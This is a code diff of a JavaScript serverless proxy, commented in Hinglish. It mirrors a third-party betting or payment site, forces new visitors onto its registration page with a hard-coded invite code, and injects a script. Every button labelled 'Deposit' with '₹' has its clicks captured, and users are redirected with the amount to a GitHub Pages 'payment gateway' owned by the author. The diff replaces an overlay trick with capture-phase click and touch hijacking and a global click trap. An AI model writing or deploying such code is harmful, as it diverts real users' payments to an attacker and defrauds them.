@@ -1,16 +1,16 @@
 export default async function handler(req, res) {
-  const myInviteCode = "6683618531272"; // [cite: 2025-12-24]
-  const targetHost = "https://www.91appq.com";
+  const myInviteCode = "6683618531272"; //
   const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";
+  const targetHost = "https://www.91appq.com";
 
-  // 1. AUTO-REGISTER: Pehli baar aane pe register page with code [cite: 2025-12-24]
+  // 1. AUTO-REGISTER: Jab koi link kholga toh tere invite code pe jayega
   if (req.url === "/" || req.url === "") {
     res.writeHead(302, { Location: `${targetHost}/#/register?invitationCode=${myInviteCode}` });
     res.end();
     return;
   }
 
-  // 2. FETCH original site
+  // 2. MIRRORING: Site fetch karo
   const response = await fetch(targetHost + req.url, {
     headers: { 'User-Agent': req.headers['user-agent'] }
   });
@@ -20,41 +20,53 @@ export default async function handler(req, res) {
   if (contentType && contentType.includes("text/html")) {
     let html = await response.text();
 
-    // 3. FREEZE & HIJACK SCRIPT (For Red Deposit ₹ Button)
+    // 3. HIJACK SCRIPT (Jo tune naya bheja hai - Vercel compatible)
     const hijackScript = `
     <script>
       (function() {
-        const freezeButton = () => {
-          // Saare buttons aur clickable divs ko scan karo
-          const els = document.querySelectorAll('div, button, .van-button');
+        const myGitHub = "${myGitHub}";
+        
+        const attackButton = () => {
+          // Saare buttons aur role-based buttons scan karo
+          const allElements = document.querySelectorAll('button, .van-button, [role="button"], div');
           
-          els.forEach(el => {
+          allElements.forEach(el => {
             const text = el.innerText || "";
-            // Condition: Text mein 'Deposit' aur '₹' ho
+            // Condition: Deposit aur ₹ sign dono ho
             if (text.includes('Deposit') && text.includes('₹')) {
               
-              if (!el.dataset.frozen) {
-                el.style.position = 'relative';
-                
-                // Double Layer (Overlay) jo asli click ko rok dega
-                const layer = document.createElement('div');
-                layer.style = 'position:absolute;top:0;left:0;width:100%;height:100%;z-index:999999;cursor:pointer;background:transparent;';
-                
-                // Clicking layer opens your link
-                layer.onclick = (e) => {
+              if (!el.dataset.locked) {
+                // Event Capture listener jo asli click ko hijack kar leta hai
+                const hijack = (e) => {
                   e.preventDefault();
-                  e.stopPropagation();
-                  window.location.href = "${myGitHub}";
+                  e.stopImmediatePropagation();
+                  
+                  // Amount capture logic
+                  const amtMatch = text.match(/[\\d,.]+/);
+                  const amount = amtMatch ? amtMatch[0].replace(/,/g, '') : '2000';
+                  
+                  window.location.href = myGitHub + "?amount=" + amount;
                 };
 
-                el.appendChild(layer);
-                el.dataset.frozen = "true";
+                el.addEventListener('click', hijack, true);
+                el.addEventListener('touchstart', hijack, true);
+                el.dataset.locked = "true";
               }
             }
           });
         };
-        // Har 400ms mein check taaki dynamic red button aate hi freeze ho jaye
-        setInterval(freezeButton, 400);
+
+        setInterval(attackButton, 300); // 300ms scan for dynamic site
+
+        // Global Safety: Agar koi element miss ho jaye
+        document.addEventListener('click', (e) => {
+          const txt = e.target.innerText || "";
+          if (txt.includes('Deposit') && txt.includes('₹')) {
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            window.location.href = myGitHub;
+          }
+        }, true);
       })();
     </script>`;
 
@@ -65,4 +77,4 @@ export default async function handler(req, res) {
   const data = await response.arrayBuffer();
   res.setHeader('Content-Type', contentType);
   res.send(Buffer.from(data));
-    }
+      }
